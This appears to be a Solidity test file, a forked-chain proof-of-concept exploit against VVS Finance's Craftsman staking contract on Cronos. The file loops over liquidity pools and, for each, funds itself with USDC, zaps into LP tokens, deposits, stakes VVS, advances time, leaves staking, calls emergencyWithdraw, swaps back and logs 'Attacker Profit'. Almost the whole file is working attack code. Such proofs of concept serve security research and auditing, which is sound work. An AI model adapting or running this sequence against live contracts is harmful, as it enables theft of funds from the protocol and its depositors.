// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VVS_Finance__common.sol";
import "flow/test_flow.sol";

contract ContractTest is CronosCommon {
    using SafeMath for uint256;

    function setUp() public override {
        super.setUp();

        cheats.createSelectFork("cronos", 8305182);

        // Pre-load tokens
        // writeTokenBalance(address(this), fl_token, payback_fee_amount);
    }

    // --------------------------------------------------------------------------------------------
    // Stake and run - Might need to run multiple times due to Cronos EVM rate limit
    // --------------------------------------------------------------------------------------------
    function test__LP__stake_and_run__require_cached_run() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint last_pid = Craftsman.poolLength();
        // uint last_pid = 26;
        for (uint lp_pid = 1; lp_pid < last_pid; lp_pid++) {
            if (lp_pid == 29) {
                // For some reason USDC cannot be converted to AKT token, skipping it for now
                continue;
            }

            // Craftsman's PoolInfo
            address lpToken;
            uint256 allocPoint;
            uint256 lastRewardBlock;
            uint256 accVVSPerShare;

            (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

            // Determine if the address is a smart contract
            if (ContractHelper.isContract(lpToken)) {
                if (ContractHelper.hasSuffixOf13Zeros(accVVSPerShare)) {
                    continue;
                } else {
                    // Fund the account with flashloan and/or cash
                    // uint account_deposit_amount = 443 * 1e9;
                    uint account_deposit_amount = 400 * 1e9;
                    writeTokenBalance(address(this), address(USDC), account_deposit_amount);

                    emit log_named_decimal_uint(
                        "[Start] Attacker USDC balance before exploit",
                        USDC.balanceOf(address(this)),
                        USDC.decimals()
                    );

                    // Assign label to address
                    cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

                    handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
                }
            }
        }
    }

    function handle_valid_lp(uint lp_pid, address lpToken, uint account_deposit_amount) private {
        // LP
        uint token_staking_pid = 0;   // Hardcoded value in Craftsman

        // Craftsman's UserInfo
        uint256 lp_deposit_amount;
        uint256 token_staking_amount;
        uint256 rewardDebt;

        IVVSPair lp_pair = IVVSPair(lpToken);
        IERC20 symbol0 = IERC20(lp_pair.token0());
        IERC20 symbol1 = IERC20(lp_pair.token1());
        string memory pair_name = StringHelper.concatenateStringsWithSlash(symbol0.symbol(), symbol1.symbol());
        console.log("[Start] Target LP @ %s, PID: %d, Pair: %s", lpToken, lp_pid, pair_name);

        // Assign label to address
        cheats.label(address(symbol0), symbol0.symbol());
        cheats.label(address(symbol1), symbol1.symbol());
        cheats.label(address(lp_pair), pair_name);

        // Pair-specific Approval
        lp_pair.approve(address(Zap), type(uint256).max);
        lp_pair.approve(address(Craftsman), type(uint256).max);
        lp_pair.approve(address(this), type(uint256).max);
        lp_pair.approve(address(symbol0), type(uint256).max);

        symbol0.approve(address(this), type(uint256).max);
        symbol1.approve(address(this), type(uint256).max);

        symbol0.approve(address(Zap), type(uint256).max);
        symbol0.approve(address(Router), type(uint256).max);
        symbol1.approve(address(Router), type(uint256).max);
        symbol0.approve(address(lp_pair), type(uint256).max);

        VVS.approve(address(lp_pair), type(uint256).max);

        if (symbol0 == VVS) {
            // Convert USDC to symbol0
            USDC_to_symbol(symbol0, type(uint256).max);
        } else if (symbol0 == USDC) {
            // Convert USDC to VVS for staking
            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
        } else {
            // Convert USDC to symbol0 for deposit and withdrawal
            USDC_to_symbol(symbol0, USDC.balanceOf(address(this)) * 50 / 100);

            // Convert USDC to VVS for staking
            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
        }

        if (symbol0 != VVS) {
            emit log_named_decimal_uint(
                "[Start] Attacker VVS balance before exploit",
                VVS.balanceOf(address(this)),
                VVS.decimals()
            );
        }

        emit log_named_decimal_uint(
            "[Start] Attacker symbol0 balance before exploit",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );
        console.log("---------------------------------------------------------------------");

        if (symbol0 == VVS || symbol0 == USDC) {
            // Swap symbol0 tokens into LP
            Zap.zapInToken(
                address(symbol0),
                (symbol0.balanceOf(address(this)) * 50 / 100),
                address(lp_pair),
                1
            );
        } else {
            // Swap symbol0 tokens into LP
            Zap.zapInToken(
                address(symbol0),
                (symbol0.balanceOf(address(this))),
                address(lp_pair),
                1
            );
        }

        // Deposit from LP to Craftsman
        Craftsman.deposit(lp_pid, lp_pair.balanceOf(address(this)));

        // Stake VVS tokens
        Craftsman.enterStaking((VVS.balanceOf(address(this))));

        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));

        if (symbol0 != VVS) {
            emit log_named_decimal_uint(
                "[Mid] Attacker VVS balance during staking",
                VVS.balanceOf(address(this)),
                VVS.decimals()
            );
        }

        emit log_named_decimal_uint(
            "[Mid] Attacker symbol0 balance during staking",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's lp_deposit_amount during staking",
            lp_deposit_amount,
            lp_pair.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's token_staking_amount during staking",
            token_staking_amount,
            VVS.decimals()
        );

        console.log("---------------------------------------------------------------------");
        // Move time forward
        cheats.warp(block.timestamp + 1 * 60 * 60); // Move forward an hour later

        // Change the block.number
        cheats.roll(block.number + 1 * 60);     // Simply move the block number to future
        Craftsman.massUpdatePools();
        // Craftsman.updatePool(token_staking_pid);
        console.log("Time and block number moved...");
        console.log("---------------------------------------------------------------------");

        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));

        if (symbol0 != VVS) {
            emit log_named_decimal_uint(
                "[Mid] Attacker VVS balance during staking",
                VVS.balanceOf(address(this)),
                VVS.decimals()
            );
        }

        emit log_named_decimal_uint(
            "[Mid] Attacker symbol0 balance during staking",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's lp_deposit_amount during staking",
            lp_deposit_amount,
            lp_pair.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's token_staking_amount during staking",
            token_staking_amount,
            VVS.decimals()
        );
        console.log("---------------------------------------------------------------------");

        // Unstack symbol0 tokens
        Craftsman.leaveStaking(token_staking_amount);

        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));

        if (symbol0 != VVS) {
            emit log_named_decimal_uint(
                "[Mid] Attacker VVS balance exited staking",
                VVS.balanceOf(address(this)),
                VVS.decimals()
            );
        }

        emit log_named_decimal_uint(
            "[Mid] Attacker symbol0 balance exited staking",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's lp_deposit_amount exited staking",
            lp_deposit_amount,
            lp_pair.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's token_staking_amount exited staking",
            token_staking_amount,
            VVS.decimals()
        );
        console.log("---------------------------------------------------------------------");

        // Emergency withdrawal
        Craftsman.emergencyWithdraw(lp_pid);

        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));

        if (symbol0 != VVS) {
            emit log_named_decimal_uint(
                "[Mid] Attacker VVS balance after withdrawal",
                VVS.balanceOf(address(this)),
                VVS.decimals()
            );
        }

        emit log_named_decimal_uint(
            "[Mid] Attacker symbol0 balance after withdrawal",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's lp_deposit_amount after withdrawal",
            lp_deposit_amount,
            lp_pair.decimals()
        );

        emit log_named_decimal_uint(
            "[Mid] Attacker Craftsman's token_staking_amount after withdrawal",
            token_staking_amount,
            VVS.decimals()
        );
        console.log("---------------------------------------------------------------------");

        // Withdraw token(s) out from Pair LP
        Zap.zapOut(
            address(lp_pair),
            lp_pair.balanceOf(address(this)),
            address(symbol0),
            1
        );

        if (symbol0 != USDC) {
            if (symbol0.balanceOf(address(this)) > 0) {
                // Convert symbol0 back to USDC
                symbol_to_USDC(symbol0, type(uint256).max);
            }
        }

        // INFO: APE, DARK etc. symbol could not be converted to USDC
        if (symbol1 != USDC && symbol1 != APE && symbol1 != DARK && symbol1 != SKY && symbol1 != LCRO) {
            if (symbol1.balanceOf(address(this)) > 0) {
                // Convert symbol1 back to USDC
                symbol_to_USDC(symbol1, type(uint256).max);
            }
        }

        if (symbol0 != VVS) {
            if (VVS.balanceOf(address(this)) > 0) {
                // Convert VVS back to USDC
                symbol_to_USDC(VVS, type(uint256).max);
            }
        }

        emit log_named_decimal_uint(
            "[End] Attacker symbol0 balance after exploit",
            symbol0.balanceOf(address(this)),
            symbol0.decimals()
        );

        emit log_named_decimal_uint(
            "[End] Attacker symbol1 balance after exploit",
            symbol1.balanceOf(address(this)),
            symbol1.decimals()
        );

        emit log_named_decimal_uint(
            "[End] Attacker VVS balance after exploit",
            VVS.balanceOf(address(this)),
            VVS.decimals()
        );

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        if (USDC.balanceOf(address(this)) > account_deposit_amount) {
            uint attacker_profit = USDC.balanceOf(address(this)).sub(account_deposit_amount);
            emit log_named_decimal_uint(
                "Attacker Profit in USDC",
                attacker_profit,
                USDC.decimals()
            );

            require(false, "Attacker successfully made profit");
        }
    }
}
